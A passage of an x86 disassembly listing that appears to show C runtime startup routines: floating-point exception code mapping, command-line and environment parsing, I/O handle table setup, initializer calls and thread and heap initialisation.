  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
  42356a:	mov    DWORD PTR [esi],eax
  42356c:	lea    ecx,[eax+0x480]
  423572:	jmp    0x42358a
  423574:	and    BYTE PTR [eax+0x4],0x0
  423578:	or     DWORD PTR [eax],0xffffffff
  42357b:	and    DWORD PTR [eax+0x8],0x0
  42357f:	mov    BYTE PTR [eax+0x5],0xa
  423583:	mov    ecx,DWORD PTR [esi]
  423585:	add    eax,0x24
  423588:	add    ecx,ebx
  42358a:	cmp    eax,ecx
  42358c:	jb     0x423574
  42358e:	add    esi,0x4
  423591:	cmp    DWORD PTR ds:0x45d148,edi
  423597:	jl     0x423558
  423599:	jmp    0x4235a1
  42359b:	mov    edi,DWORD PTR ds:0x45d148
  4235a1:	xor    ebx,ebx
  4235a3:	test   edi,edi
  4235a5:	jle    0x423611
  4235a7:	mov    eax,DWORD PTR [esp+0x10]
  4235ab:	mov    eax,DWORD PTR [eax]
  4235ad:	cmp    eax,0xffffffff
  4235b0:	je     0x423606
  4235b2:	mov    cl,BYTE PTR [ebp+0x0]
  4235b5:	test   cl,0x1
  4235b8:	je     0x423606
  4235ba:	test   cl,0x8
  4235bd:	jne    0x4235ca
  4235bf:	push   eax
  4235c0:	call   DWORD PTR ds:0x428060
  4235c6:	test   eax,eax
  4235c8:	je     0x423606
  4235ca:	mov    ecx,ebx
  4235cc:	mov    eax,ebx
  4235ce:	and    eax,0x1f
  4235d1:	lea    eax,[eax+eax*8]
  4235d4:	sar    ecx,0x5
  4235d7:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  4235de:	lea    esi,[ecx+eax*4]
  4235e1:	mov    eax,DWORD PTR [esp+0x10]
  4235e5:	mov    eax,DWORD PTR [eax]
  4235e7:	mov    DWORD PTR [esi],eax
  4235e9:	mov    al,BYTE PTR [ebp+0x0]
  4235ec:	mov    BYTE PTR [esi+0x4],al
  4235ef:	lea    eax,[esi+0xc]
  4235f2:	push   0xfa0
  4235f7:	push   eax
  4235f8:	call   0x42493d
  4235fd:	test   eax,eax
  4235ff:	pop    ecx
  423600:	pop    ecx
  423601:	je     0x423631
  423603:	inc    DWORD PTR [esi+0x8]
  423606:	add    DWORD PTR [esp+0x10],0x4
  42360b:	inc    ebx
  42360c:	inc    ebp
  42360d:	cmp    ebx,edi
  42360f:	jl     0x4235a7
  423611:	xor    ebx,ebx
  423613:	mov    ecx,DWORD PTR ds:0x45d160
  423619:	lea    eax,[ebx+ebx*8]
  42361c:	lea    esi,[ecx+eax*4]
  42361f:	cmp    DWORD PTR [esi],0xffffffff
  423622:	jne    0x423693
  423624:	test   ebx,ebx
  423626:	mov    BYTE PTR [esi+0x4],0x81
  42362a:	jne    0x423636
  42362c:	push   0xfffffff6
  42362e:	pop    eax
  42362f:	jmp    0x423640
  423631:	or     eax,0xffffffff
  423634:	jmp    0x4236af
  423636:	mov    eax,ebx
  423638:	dec    eax
  423639:	neg    eax
  42363b:	sbb    eax,eax
  42363d:	add    eax,0xfffffff5
  423640:	push   eax
  423641:	call   DWORD PTR ds:0x42803c
  423647:	mov    edi,eax
  423649:	cmp    edi,0xffffffff
  42364c:	je     0x42368d
  42364e:	push   edi
  42364f:	call   DWORD PTR ds:0x428060
  423655:	test   eax,eax
  423657:	je     0x42368d
  423659:	and    eax,0xff
  42365e:	cmp    eax,0x2
  423661:	mov    DWORD PTR [esi],edi
  423663:	jne    0x42366b
  423665:	or     BYTE PTR [esi+0x4],0x40
  423669:	jmp    0x423674
  42366b:	cmp    eax,0x3
  42366e:	jne    0x423674
  423670:	or     BYTE PTR [esi+0x4],0x8
  423674:	lea    eax,[esi+0xc]
  423677:	push   0xfa0
  42367c:	push   eax
  42367d:	call   0x42493d
  423682:	test   eax,eax
  423684:	pop    ecx
  423685:	pop    ecx
  423686:	je     0x423631
  423688:	inc    DWORD PTR [esi+0x8]
  42368b:	jmp    0x423697
  42368d:	or     BYTE PTR [esi+0x4],0x40
  423691:	jmp    0x423697
  423693:	or     BYTE PTR [esi+0x4],0x80
  423697:	inc    ebx
  423698:	cmp    ebx,0x3
  42369b:	jl     0x423613
  4236a1:	push   DWORD PTR ds:0x45d148
  4236a7:	call   DWORD PTR ds:0x42805c
  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
